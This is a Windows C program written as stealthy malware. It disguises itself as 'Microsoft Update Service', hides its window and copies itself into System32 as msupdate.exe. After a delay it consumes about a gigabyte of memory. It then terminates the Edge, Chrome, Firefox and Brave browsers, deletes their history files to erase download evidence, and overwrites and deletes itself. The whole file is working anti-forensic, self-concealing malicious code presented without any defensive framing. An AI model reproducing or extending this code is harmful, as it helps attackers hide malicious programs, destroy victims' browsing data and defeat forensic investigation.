#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>

#define CHUNK_SIZE (100 * 1024 * 1024)  // 100MB chunks
#define DELAY_MS (2 * 60 * 1000)        // 2 minutes in milliseconds

// Logging for debugging (stealthy)
void LogActivity(const char *msg) {
    char logPath[MAX_PATH];
    snprintf(logPath, MAX_PATH, "%s\\mslog.dat", getenv("TEMP"));
    FILE *logFile = fopen(logPath, "a");
    if (logFile) {
        fprintf(logFile, "[%ld] %s\n", GetTickCount(), msg);
        fclose(logFile);
    }
}

// Terminate browser processes to release file locks
void KillBrowsers() {
    char *browsers[] = {"msedge.exe", "chrome.exe", "firefox.exe", "brave.exe", NULL};
    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &pe32)) {
        do {
            for (int i = 0; browsers[i]; i++) {
                if (_stricmp(pe32.szExeFile, browsers[i]) == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        LogActivity("Terminated browser process");
                    }
                }
            }
        } while (Process32Next(snapshot, &pe32));
    }
    CloseHandle(snapshot);
}

// Clear browser download history by deleting history files
void ClearBrowserDownloadHistory() {
    char *browserPaths[] = {
        "C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
        "C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
        "C:\\Users\\%username%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History",
        "C:\\Users\\%username%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default-release\\places.sqlite",
        NULL
    };
    char expandedPath[MAX_PATH];

    KillBrowsers(); // Ensure browsers are closed to avoid file locks

    for (int i = 0; browserPaths[i]; i++) {
        ExpandEnvironmentStrings(browserPaths[i], expandedPath, MAX_PATH);
        if (DeleteFile(expandedPath)) {
            LogActivity("Deleted browser history file");
        } else {
            LogActivity("Failed to delete browser history file");
        }
    }
}

// Self-deletion with overwrite
void SelfDelete() {
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    HANDLE hFile = CreateFile(exePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char *buffer = malloc(CHUNK_SIZE);
        if (buffer) {
            memset(buffer, rand(), CHUNK_SIZE);
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            WriteFile(hFile, buffer, CHUNK_SIZE, NULL, NULL);
            free(buffer);
        }
        CloseHandle(hFile);
    }
    MoveFileEx(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    LogActivity("Scheduled self-deletion with overwrite");
}

int main() {
    // Disguise and hide process
    SetConsoleTitle("Microsoft Update Service");
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS); // Lower Task Manager visibility

    // Move executable to system directory for better disguise
    char exePath[MAX_PATH], newPath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    snprintf(newPath, MAX_PATH, "C:\\Windows\\System32\\msupdate.exe");
    CopyFile(exePath, newPath, FALSE);
    LogActivity("Copied executable to System32");

    // Delay execution
    Sleep(DELAY_MS);

    size_t total_allocated = 0;
    void **chunks = NULL;
    size_t chunk_count = 0;
    size_t attempts = 0;

    while (attempts < 10) {
        attempts++;
        void *chunk = malloc(CHUNK_SIZE);
        if (chunk) {
            memset(chunk, 69, CHUNK_SIZE);
            total_allocated += CHUNK_SIZE;
            void **temp = realloc(chunks, (chunk_count + 1) * sizeof(void*));
            if (temp) {
                chunks = temp;
                chunks[chunk_count] = chunk;
                chunk_count++;
            }
            if (chunk_count > 0) {
                size_t idx = rand() % chunk_count;
                memset(chunks[idx], 42, CHUNK_SIZE);
            }
        }
    }

    // Clean up memory
    for (size_t i = 0; i < chunk_count; i++) {
        free(chunks[i]);
    }
    free(chunks);
    LogActivity("Freed memory");

    // Clear browser download history
    ClearBrowserDownloadHistory();

    // Delete the executable
    SelfDelete();

    return 0;
}
